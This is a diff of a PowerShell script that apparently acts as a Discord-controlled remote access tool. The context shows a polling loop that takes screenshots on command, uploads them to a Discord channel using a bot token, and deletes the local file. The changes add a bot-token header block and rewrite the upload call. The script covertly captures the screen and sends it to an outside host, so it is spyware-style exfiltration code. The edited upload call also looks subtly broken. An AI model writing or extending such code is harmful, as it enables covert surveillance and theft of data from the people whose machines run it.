@@ -6,6 +6,11 @@ $headers = @{
     "Content-Type" = "application/json"
 }
 
+$fileheaders = @{
+    "Authorization" = "Bot $TOKEN"
+    "User-Agent" = "Powershell"
+}
+
 function Invoke-DiscordAPI {
     param([string]$Method, [string]$Endpoint, $Body = $null)
     $url = "$baseUrl/$Endpoint"
@@ -78,7 +83,7 @@ while ($true) {
                 $path = Get-Screenshot
                 if ($path) {
                     Send-DiscordMessage -channelID $channel.id -content "Screenshot taken:" 
-                    Invoke-WebRequest -Uri "$baseUrl/channels/$($channel.id)/messages" -Method Post -Headers $headers -Form @{ file = Get-Item -Path $path }
+                    Invoke-RestMethod -Uri "$baseUrl/channels/$($channel.id)/messages" -Method Post -Headers $headers -InFile $path -ContentType "multipart/form-data"
                     Remove-Item -Path $path
                 } else {
                     Send-DiscordMessage -channelID $channel.id -content "Failed to take screenshot."
